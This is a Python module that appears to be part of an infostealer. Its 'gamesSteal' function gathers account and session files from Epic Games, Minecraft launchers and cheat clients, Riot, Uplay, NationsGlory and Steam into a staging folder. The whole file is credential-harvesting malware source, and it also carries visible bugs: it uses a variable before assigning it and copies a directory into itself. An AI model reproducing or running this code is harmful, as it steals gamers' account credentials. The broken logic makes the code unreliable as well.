import os
import shutil
from getpass import getuser



def __copy_data__(path: str, new_dir: str) -> None:
    if os.path.isdir(path):
        try:
            shutil.copytree(path, os.path.join(path, os.path.basename(path)), dirs_exist_ok=True)
        except PermissionError as err:
            return
    
    elif os.path.isfile(path):
        try:
            shutil.copy2(path, os.path.join(new_dir, os.path.basename(path)))
        except PermissionError as err:
            print(err)


def gamesSteal(kingFolder: str) -> None:
    app_data = os.getenv("APPDATA")
    local_app_data = os.getenv("LOCALAPPDATA")
    gamePath: dict[str, dict[str, str] | str] = {
        "Epic Games": os.path.join(local_app_data, "EpicGamesLauncher", "Saved", "Config", "Windows", "GameUserSettings.ini"),
    
        "Minecraft": {
            "Intent":          os.path.join(app_data, "intentlauncher", "launcherconfig"),
            "Lunar":           os.path.join(app_data, ".lunarclient", "settings", "game", "accounts.json"),
            "TLauncher":       os.path.join(app_data, ".minecraft", "TlauncherProfiles.json"),
            "Feather":         os.path.join(app_data, ".feather", "accounts.json"),
            "Meteor":          os.path.join(app_data, ".minecraft", "meteor-client", "accounts.nbt"),
            "Impact":          os.path.join(app_data, ".minecraft", "Impact", "alts.json"),
            "Novoline":        os.path.join(app_data, ".minecraft", "Novoline", "alts.novo"),
            "CheatBreakers":   os.path.join(app_data, ".minecraft", "cheatbreaker_accounts.json"),
            "Microsoft Store": os.path.join(app_data, ".minecraft", "launcher_accounts_microsoft_store.json"),
            "Rise":            os.path.join(app_data, ".minecraft", "Rise", "alts.txt"),
            "Rise (Intent)":   os.path.join(app_data, "intentlauncher", "Rise", "alts.txt"),
            "Paladium":        os.path.join(app_data, "paladium-group", "accounts.json"),
            "PolyMC":          os.path.join(app_data, "PolyMC", "accounts.json"),
            "Badlion":         os.path.join(app_data, "Badlion Client", "accounts.json"),
            "Sklancher" : os.path.join(local_app_data, "minecraft", "Sklancher", "accounts.bat")
        },
    
        "Riot Games": {
            "Config": os.path.join(local_app_data, "Riot Games", "Riot Client", "Config"),
            "Data":   os.path.join(local_app_data, "Riot Games", "Riot Client", "Data"),
            "Logs":   os.path.join(local_app_data, "Riot Games", "Riot Client", "Logs"),
            # %LOCALAPPDATA%\Riot Games\Riot Client\Data
        },
    
        "Uplay": os.path.join(local_app_data, "Ubisoft Game Launcher"),
    
        "NationsGlory": os.path.join(app_data, "NationsGlory", "Local Storage", "leveldb"),
    }
    
    
    
    for gameName, value in gamePath.items():
        if isinstance(value, dict):
            for name, paths in value.items():
                if os.path.exists(paths):
                    tempDir: str = os.path.join(kingFolder, 'Games', name)
                    os.makedirs(tempDir, exist_ok=True)
                    __copy_data__(paths, new_path)
        else:
            if os.path.exists(value):
                new_path: str = os.path.join(kingFolder, gameName)
                os.makedirs(new_path, exist_ok=True)
                __copy_data__(value, new_path)
                
    steam_paths: list[str] = [
        f"C:\\Users\\{getuser()}\\AppData\\Local\\Steam",
        "C:\\Program Files (x86)\\Steam\\config"
    ]

    for steamPath in steam_paths:
        if not os.path.exists(steamPath):
            continue
        steam_folder: str = os.path.join(kingFolder, "Steam")
        os.makedirs(steam_folder, exist_ok=True)
        for file_name in os.listdir(steamPath):
            all_path_file: str = os.path.join(steamPath, file_name)

            if os.path.isfile(all_path_file) and all_path_file.upper().endswith(('.VDF', '.TMP')):
                __copy_data__(all_path_file, steam_folder)